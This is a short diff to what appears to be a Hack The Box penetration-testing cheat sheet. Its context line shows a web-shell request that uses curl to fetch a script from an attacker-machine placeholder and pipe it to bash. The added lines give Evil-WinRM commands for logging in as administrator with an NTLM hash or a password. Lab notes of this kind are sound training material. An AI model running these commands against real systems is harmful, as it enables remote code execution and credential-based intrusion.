@@ -31,3 +31,8 @@ http://thetoppers.htb/shell.php?cmd=curl%<attacking machine ip>:8000/shell.sh|ba
 ```bash
 ntpdate pool.ntp.org  # Sync system clock with NTP server to avoid time skew issues
 ```
+
+### 🔐 Evil-WinRM Access
+```bash
+evil-winrm -i administrator.htb -u administrator -H <NTLM_hash>   # Login using NTLM hash
+evil-winrm -i administrator.htb -u administrator -p <password>    # Login using password
